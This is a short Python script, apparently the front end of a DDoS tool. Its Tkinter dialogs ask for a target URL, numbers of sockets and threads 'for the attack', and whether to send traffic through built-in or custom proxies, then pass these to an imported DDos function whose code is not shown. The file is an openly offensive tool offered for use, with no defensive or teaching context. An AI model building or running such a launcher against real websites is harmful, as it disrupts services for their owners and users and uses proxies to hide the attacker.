from DDos import DDos, checkUrl
from re import compile, match
from tkinter import Tk
from tkinter.messagebox import showerror, askquestion
from tkinter.simpledialog import askstring
from tkinter.filedialog import askopenfile
def main():
    int_re, root, use_proxies, custom_proxies = compile(r'^\d+$'), Tk(), False, None
    root.withdraw()
    while True:
        url = askstring("URL", "        Enter the url for the attack        ")
        if url is not None:
            if checkUrl(url): break
            root.bell()
            showerror("Error", "Not a valid url, try again")
        else: exit()
    while True:
        sockets = askstring("SOCKETS", "Enter the number of sockets for the attack", initialvalue = "500")
        if sockets is not None:
            if match(int_re, sockets): break
            root.bell()
            showerror("Error", "Not a valid number, try again")
        else: exit()
    while True:
        threads = askstring("THREADS", "Enter the number of threads for the attack", initialvalue = "10")
        if threads is not None:
            if match(int_re, threads): break
            root.bell()
            showerror("Error", "Not a valid number, try again")
        else: exit()
    if askquestion("PROXIES", "Would you like to use proxies?") == "yes":
        use_proxies = True
        if askquestion("PROXIES", "Whould you like to use the built-in proxies?") == "no": custom_proxies = askopenfile(filetypes = (("Any file", "*.*"),)).readlines()
    root.update()
    DDos(url, int(sockets), int(threads), use_proxies, custom_proxies)
if __name__ == "__main__": main()